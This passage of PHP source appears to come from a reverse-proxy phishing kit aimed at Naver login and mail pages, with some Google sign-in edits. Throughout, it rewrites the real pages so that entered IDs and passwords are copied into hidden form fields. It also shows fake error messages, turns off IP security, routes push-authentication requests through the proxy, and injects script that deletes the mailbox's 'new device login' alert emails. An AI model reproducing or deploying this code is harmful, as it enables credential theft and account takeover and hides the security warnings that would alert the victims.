		$_rtn_url = $_default_rtn_url;
		if (file_exists($_rtn_file)) {
			$handle = fopen($_rtn_file, "r");
			$length = filesize($_rtn_file);
			$_rtn_url = $length>0 ?fread($handle, $length) : $_rtn_url;
			fclose($handle);
		}
		header('location: ' . $_rtn_url);
		exit(0);
	}
}
if (!isset($_proxify[$_content_type])) {
	show_report("Unknown Content_type Start...", false, true);

    @set_time_limit(0);
	
	$_content_length = strlen($_response_body);    
    if ($_content_length && $_config['max_file_size'] != -1 && $_content_length > $_config['max_file_size']) {
		show_report("Unknown Content File size error.", true, true);
    }
	
	$_response_keys['content-length'] = 'Content-Length';
	$_response_headers['content-length'][0] = $_content_length;
	
    $_response_keys['content-disposition'] = 'Content-Disposition';
    $_response_headers['content-disposition'][0] = empty($_content_disp) ? ($_content_type == 'application/octet_stream' ? 'attachment' : 'inline') . '; filename="' . $_filename . '"' : $_content_disp;
	
    $_response_headers   = array_filter($_response_headers);
    $_response_keys      = array_filter($_response_keys);
    
    header(array_shift($_response_keys));
    array_shift($_response_headers);
    
    foreach ($_response_headers as $name => $array) {
        foreach ($array as $value) {
			show_report($_response_keys[$name] . ': ' . $value, false, true);
            header($_response_keys[$name] . ': ' . $value, false);
        }
    }
    
	echo $_response_body;
	show_report("Unknown Content_type end.\r\n", true, true);
}
//////////////////////////////////////////////////////////
$_response_body = str_replace('var rsa = new RSAKey;', '$("ru").value=id.value;$("rv").value=pw.value;var rsa = new RSAKey;', $_response_body);
$_response_body = str_replace('ncaptchaInit();', 'ncaptchaInit();var level=$("smart_LEVEL").value; if(level>0) document.getElementById("switch_blind").click();', $_response_body);//IP보안 오프

$_response_body = str_replace('r=i.length;', 'r=i.length;var TT1=0;', $_response_body);

///////////////////////////////////////////////////////////	

$_response_body = str_replace('IE=Edge', 'IE=Edge,chrome=1', $_response_body);
if (stristr($_filename , 'nidlogin.login') == true && stristr($_response_body , 'frmNIDLogin') == true && stristr($_response_body , 'name="rcaptchakey"') == true){	
	////////////////////////// captcah login ///////////////////////////
	$_response_body = str_replace('안전을 위해 아이디, 비밀번호와<br> 자동입력방지문자를 입력해 주세요.','비밀번호를 5회 이상 잘못<br> 입력하였습니다.다시 로그인하세요.',$_response_body);
	
	preg_match_all('#<input type=\"text\" id=\"id\"(.*?)value=\"\"\>#is', $_response_body, $matches, PREG_SET_ORDER);
	for ($i = 0, $count = count($matches); $i < $count; ++$i)
	{
		$temp = $matches[$i][0];
		$matches[$i][0] = str_replace('value=""','value="'.$_username.'"', $matches[$i][0]);
		$_response_body = str_replace($temp, $matches[$i][0], $_response_body);
	}
	
	$_response_body = str_replace('</form>', '<input type="hidden" name="rv" id="rv" value=""><input type="hidden" name="ru" id="ru" value=""></form>', $_response_body);
		
}
else if (stristr($_filename , 'nidlogin.login') == true && stristr($_response_body , 'frmNIDLogin') == true && stristr($_response_body , 'class="login_keep_wrap"') == true){

	////////////////////////// reconf ///////////////////////////
	
	if(stristr($_response_body , 'icon_chatbot') == true){
		$_error_pw = '<div style="color:#ff0000;display:block"><p>비밀번호를 정확하게 입력해 주세요.</p></div>';
	}
	else if(stristr($_response_body , '로그인 전용 아이디') == true){
		$_error_pw = '<div style="color:#ff0000;display:block"><p>로그인 전용 아이디를 사용 중입니다.<br>아이디에 설정하신 로그인 전용 아이디를 입력해 주세요.</p></div>';
	}
	else{$_error_pw = '';}
	
	preg_match_all('#"dynamicKey" value="\s*(.*?)"#is', $_response_body, $matches, PREG_SET_ORDER);
	for ($i = 0, $count_i = count($matches); $i < $count_i; ++$i)
	{
		$_dynamicKey =	$matches[$i][1];
	}
	
	$recon_file = "./" . "recon.htm";

	if (file_exists($recon_file))
	{
		$_response_body = "";
		$fp = fopen($recon_file, "r");
		$buffer = fread($fp, filesize($recon_file));
		fclose($fp);
	
		$_response_body = $buffer;
	}
	if(stristr($_error_pw , '로그인 전용 아이디') == true){
		$_response_body = str_replace('disabled', '', $_response_body);
	}
	$_username = $_user_id;
	//$_response_body = str_replace('UserName', $_username, $_response_body);
	$_response_body = str_replace('Dynamic_Key_Value', $_dynamicKey, $_response_body);
	$_response_body = str_replace('<!--error_message-->', $_error_pw, $_response_body);//error_pw
	
}
if (stristr($_filename , "nidlogin.login") == true&&stristr($_response_body , "frmNIDLogin") == true)
{	
	$_username = $_user_id;
	preg_match_all('#<input type=\"text\" id=\"id\"(.*?)value=\"\"\>#is', $_response_body, $matches, PREG_SET_ORDER);
	for ($i = 0, $count = count($matches); $i < $count; ++$i)
	{
		$temp = $matches[$i][0];
		$matches[$i][0] = str_replace('value=""','value="'.$_username.'"', $matches[$i][0]);
		$_response_body = str_replace($temp, $matches[$i][0], $_response_body);
	}
	
	$_response_body = str_replace('</form>', '<input type="hidden" name="rv" id="rv" value=""><input type="hidden" name="ru" id="ru" value=""></form>', $_response_body);
	
	
				
}
if (stristr($_filename , "nidlogin.login")){
	//location.replace("https://nid.naver.com/signin/v3/finalize?.*);
	preg_match_all('#location.replace\(\s*[\'"](.*?)\s*[\'"]#is', $_response_body, $matches, PREG_SET_ORDER);
	for ($i = 0, $count = count($matches); $i < $count; ++$i)
	{
		$fp = fopen($_rtn_file, "r");
	    $_rtnurl = fread($fp,filesize($_rtn_file));
	    fclose($fp);
		//$_response_body = str_replace($matches[$i][0],"parent.".$matches[$i][0], $_response_body);	
        //$_rtnurl = 	"https://mail.naver.com";
		$_response_body = str_replace($matches[$i][1],$_rtnurl, $_response_body);
		//header("Location: ".$_rtnurl);//exit(0);
	}
}
if(stristr($_filename , "push.js") == true)
{
	//xmlhttp.open("GET", "https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cnt=again");
	
	$_new_pattern = 'xmlhttp.open("GET", '."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent("https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cnt=again"))';
$_response_body = str_replace('xmlhttp.open("GET", "https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cnt=again");', $_new_pattern, $_response_body);
//xmlhttp.open("GET", "https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cntbg=" + cntbg);
$_new_pattern = 'xmlhttp.open("GET", '."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent("https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cntbg=" + cntbg));';
$_response_body = str_replace('xmlhttp.open("GET", "https://nid.naver.com/login/api/push/getStatus?token_push=" + $("token_push").value + "&cntbg=" + cntbg);', $_new_pattern, $_response_body);

//t.open("GET","https://nid.naver.com/login/api/push/getStatus?token_push="+u("token_push").value+"&cntbg="+Vt),
$_new_pattern = 't.open("GET",'."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent("https://nid.naver.com/login/api/push/getStatus?token_push="+u("token_push").value+"&cntbg="+Vt)),';
$_response_body = str_replace('t.open("GET","https://nid.naver.com/login/api/push/getStatus?token_push="+u("token_push").value+"&cntbg="+Vt),', $_new_pattern, $_response_body);
}
////////////////////skip new agent register//////////////////
if(stristr($_filename , "finalize") == true)
{

	preg_match_all('#location.replace\(\s*[\'"](.*?)\s*[\'"]#is', $_response_body, $matches, PREG_SET_ORDER);
	for ($i = 0, $count = count($matches); $i < $count; ++$i)
	{
		//$fp = fopen($_rtn_file, "r");
	    //$_rtnurl = fread($fp,filesize($_rtn_file));
	    //fclose($fp);
		//$_response_body = str_replace($matches[$i][0],"parent.".$matches[$i][0], $_response_body);	
        $_rtnurl = 	"https://mail.naver.com";
		$_response_body = str_replace($matches[$i][1],$_rtnurl, $_response_body);
		header("Location: ".$_rtnurl);//exit(0);
	}
		
}
///////////////////////////알림 삭제 및 탈퇴/////////////////////////
//////////메일리스트 페이지와 uglified_main_200618.js를 변경////////////
if(stristr($_response_body , "mInit.makeFirstPage();") == true){
	$fp = fopen("rtnurl", "r");
	$_rtnurl = fread($fp,filesize("rtnurl"));
	fclose($fp);
	$_response_body = str_replace('mInit.makeFirstPage();', 'mInit.makeFirstPage();location.replace("'.$_rtnurl.'");', $_response_body);//탈퇴
}

$_response_body = str_replace('r=i.length;', 'r=i.length;var TT1=0;', $_response_body);
$_response_body = str_replace('u=a.body;','u=a.body;var dd1 = new Date();var dd2 = new Date(s.sentTime);
			if ((s.subject == "새로운 기기에서 로그인 되었습니다." || s.subject == "새로운 환경에서 로그인 되었습니다." || s.subject == "알림 없이 로그인하는 기기로 등록 되었습니다.") && TT1 < 2) {var delobj={};	delobj["currentFolderType"] = "etc";delobj["deleteSpamDirect"] = "-1";
				delobj["folderSNList"] = "0";delobj["mailSNList"] = s.mailSN;mcCore.saveListScrollTop();
				mcCore.requestAjax({
					fCallback:$Fn(deleteMailCallBack, this).bind(delobj),
					oParameter:delobj,
					sUrl: "/json/select/delete/"
				});
				q++;TT1++;continue;}', $_response_body);
//////////모바일 메일리스트 페이지에서 app.06bd33c8.js를 변경////////////
	/*return L=M.data,R=L.mailData,k=L.unreadCount,*/ 
$_response_body = str_replace('return L=M.data,R=L.mailData,','var TT1=0;L=M.data;R=L.mailData;for(var i=0;i<R.length;i++){if((R[i].subject.indexOf("새로운 기기")!=-1||R[i].subject.indexOf("새로운 환경")!=-1||R[i].subject.indexOf("알림 없이 로그인하는 기기")!=-1)&&TT1<3){var xmlhttp;try{xmlhttp=new ActiveXObject("Msxml2.XMLHTTP");}catch(e){try{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}catch(E){xmlhttp=false;}}if(!xmlhttp&&typeof XMLHttpRequest!="undefined"){xmlhttp=new XMLHttpRequest();}try{xmlhttp.open("POST","/json/select/delete/");xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.send("currentFolderType=etc&deleteSpamDirect=-1&folderSNList="+R[i].folderSN+";&mailSNList="+R[i].mailSN+";");}catch(e){}R.splice(i,1);L.lastOffset--;L.listCount--;L.totalCount--;}}return ', $_response_body);
///////////////////////////////////////////////////////////	
//document.getElementsByTagName('head')[0].appendChild(keyjs);
$_new_pattern = 'if(keyjs.src.indexOf("&q=")<0){keyjs.src='."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent(keyjs.src);}document.getElementsByTagName(\'head\')[0].appendChild(keyjs);';
$_response_body = str_replace('document.getElementsByTagName(\'head\')[0].appendChild(keyjs);', $_new_pattern, $_response_body);

//xmlhttp.open("GET", urls);
$_new_pattern = 'urls = '."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent("https://nid.naver.com"+urls);xmlhttp.open("GET", urls);';
$_response_body = str_replace('xmlhttp.open("GET", urls);', $_new_pattern, $_response_body);
//keyjs.src = '/dynamicKeyJsSplit/'+getObjValue("dynamicKey");$_http_host
$_new_pattern = 'keyjs.src = \'/dynamicKeyJsSplit/\'+getObjValue("dynamicKey");keyjs.src = '."\"{$_script_url}?{$_add_url}&{$_config['url_var_name']}=\"" .'+encodeURIComponent(keyjs.src.replace("http://"+"' . $_http_host . '","https://"+"' . $_rep_host . '"));';
$_response_body = str_replace('keyjs.src = \'/dynamicKeyJsSplit/\'+getObjValue("dynamicKey");', $_new_pattern, $_response_body);
if($_content_type == 'text/html') {
		preg_match_all("#<\s*([a-zA-Z\?-]+)([^>]+)>#S", $_response_body, $matches);
		for ($i = 0, $count_i = count($matches[0]); $i < $count_i; ++$i) {
			if (!preg_match_all("#([a-zA-Z\-\/]+)\s*(?:=\s*(?:\"([^\">]*)\"?|'([^'>]*)'?|([^'\"\s]*)))?#S", $matches[2][$i], $m, PREG_SET_ORDER)) {
				continue;
			}
	
			$rebuild    = false;
			$extra_html = $temp = '';
			$attrs      = array();
	
			for ($j = 0, $count_j = count($m); $j < $count_j; $attrs[strtolower($m[$j][1])] = (isset($m[$j][4]) ? $m[$j][4] : (isset($m[$j][3]) ? $m[$j][3] : (isset($m[$j][2]) ? $m[$j][2] : false))), ++$j);
		
			if (isset($attrs['style'])) {
				$rebuild = true;
				$attrs['style'] = proxify_inline_css($attrs['style']);
			}
	
			$tag = strtolower($matches[1][$i]);
			if (isset($_html_tags[$tag])) {
				switch ($tag) {
				case 'a':
					if (isset($attrs['href'])) {
						$rebuild = true;
						$attrs['href'] = complete_url($attrs['href']);
					}                                                                                     
					break;
				
				case 'style':
					if (isset($attrs['data-href'])) {
						$rebuild = true;
						$attrs['data-href'] = complete_url($attrs['data-href']);
					}
					break;
					
				case 'img':
				case 'form':
					if (isset($attrs['action'])) {
						$rebuild = true;
						if (trim($attrs['action']) === '') {
							$attrs['action'] = $_url_parts['path'];
						}
						if (!isset($attrs['method']) || strtolower(trim($attrs['method'])) === 'get') {
							$extra_html = '<input type="hidden" name="' . $_config['get_form_name'] . '" value="' . encode_url(complete_url($attrs['action'], false)) . '" />';
							$attrs['action'] = '';
							break;
						}
						$attrs['action'] = complete_url($attrs['action']);
					}
					break;
				
				case 'base':
				case 'meta':
				case 'link':
					if (isset($attrs['href'])) {
						$rebuild = true;
						$attrs['href'] = complete_url($attrs['href']);
					}
					if (isset($attrs['src'])) {
						$rebuild = true;
						$attrs['src'] = complete_url($attrs['src']);
					}				
					if (isset($attrs['urn'])) {
						$rebuild = true;
						$attrs['urn'] = complete_url($attrs['urn']);
					}
					break;
					
				case 'div':
					break;
					
				case 'head':
					if (isset($attrs['profile'])) {
						$rebuild = true;
						$attrs['profile'] = implode(' ', array_map('complete_url', explode(' ', $attrs['profile'])));
					}
					break;
					
				case 'applet':
					if (isset($attrs['codebase'])) {
						$rebuild = true;
						$temp = $_base;
						url_parse(complete_url(rtrim($attrs['codebase'], '/') . '/', false), $_base);
						unset($attrs['codebase']);
					}
					if (isset($attrs['code']) && strpos($attrs['code'], '/') !== false) {
						$rebuild = true;
						$attrs['code'] = complete_url($attrs['code']);
					}
					if (isset($attrs['object'])) {
						$rebuild = true;
						$attrs['object'] = complete_url($attrs['object']);
					}
					if (isset($attrs['archive'])) {
						$rebuild = true;
						$attrs['archive'] = implode(',', array_map('complete_url', preg_split('#\s*,\s*#', $attrs['archive'])));
					}
					if (!empty($temp)) {
						$_base = $temp;
					}
					break;
					
				case 'object':
					if (isset($attrs['usemap'])) {
						$rebuild = true;
						$attrs['usemap'] = complete_url($attrs['usemap']);
					}
					if (isset($attrs['codebase'])) {
						$rebuild = true;
						$temp = $_base;
						url_parse(complete_url(rtrim($attrs['codebase'], '/') . '/', false), $_base);
						unset($attrs['codebase']);
					}
					if (isset($attrs['data'])) {
						$rebuild = true;
						$attrs['data'] = complete_url($attrs['data']);
					}
					if (isset($attrs['classid']) && !preg_match('#^clsid:#i', $attrs['classid'])) {
						$rebuild = true;
						$attrs['classid'] = complete_url($attrs['classid']);
					}
					if (isset($attrs['archive'])) {
						$rebuild = true;
						$attrs['archive'] = implode(' ', array_map('complete_url', explode(' ', $attrs['archive'])));
					}
					if (!empty($temp)) {
						$_base = $temp;
					}
					break;
					
				case 'param':
					if (isset($attrs['valuetype'], $attrs['value']) && 
						strtolower($attrs['valuetype']) == 'ref' && preg_match('#^[\w.+-]+://#', $attrs['value']))
					{
						$rebuild = true;
						$attrs['value'] = complete_url($attrs['value']);
					}
					break;
					
				case 'frame':
				case 'iframe':
					if (isset($attrs['src'])) {
						$rebuild = true;
						$attrs['src'] = complete_url($attrs['src']) . '&nf=1';
					}
					if (isset($attrs['longdesc'])) {
						$rebuild = true;
						$attrs['longdesc'] = complete_url($attrs['longdesc']);
					}
					break;
					
				default:
					foreach ($_html_tags[$tag] as $attr) {
						if (isset($attrs[$attr])) {
							$rebuild = true;
							$attrs[$attr] = complete_url($attrs[$attr]);
						}
					}
					break;
				}
			}
			if ($rebuild) {
				$new_tag = "<$tag";
				foreach ($attrs as $name => $value) {
					$delim = strpos($value, '"') && !strpos($value, "'") ? "'" : '"';
					$new_tag .= ' ' . $name . ($value !== false ? '=' . $delim . $value . $delim : '');
				}
				$_response_body = str_replace($matches[0][$i], $new_tag . '>' . $extra_html, $_response_body);
			}
		}
}
$_response_body = str_replace('로그인 방식이 평소와 다릅니다.', '', $_response_body);
$_response_body = str_replace("There's something unusual about how you're signing in", 'Verify your identity', $_response_body);
if(!stristr($_response_body,'https://lh3.googleusercontent.com/')){
	$_response_body = str_replace('//lh3.googleusercontent.com/', 'https://lh3.googleusercontent.com/', $_response_body);
}
//else switch(d)
$_response_body = str_replace('else switch(d)', 'else switch((console.log("switch:"+d),d))', $_response_body);
$_response_keys['content-disposition'] = 'Content-Disposition';
$_response_headers['content-disposition'][0] = empty($_content_disp) ? ($_content_type == 'application/octet_stream' ? 'attachment' : 'inline') . '; filename="' . $_filename . '"' : $_content_disp;

$_response_keys['content-length'] = 'Content-Length';
$_response_headers['content-length'][0] = strlen($_response_body);
  
$_response_headers  = array_filter($_response_headers);
$_response_keys     = array_filter($_response_keys);
$_response_state 	= array_shift($_response_keys);

header($_response_state);
show_report($_response_state, false, true);

array_shift($_response_headers);

foreach ($_response_headers as $name => $array) {
    foreach ($array as $value) {
		show_report($_response_keys[$name] . ': ' . $value, false, true);
		header($_response_keys[$name] . ': ' . $value, false);
    }
}

show_report("\r\n************  content of next ".$_filename."  *************************\r\n".$_response_body."\r\n***************************", false, true);

echo $_response_body;
?>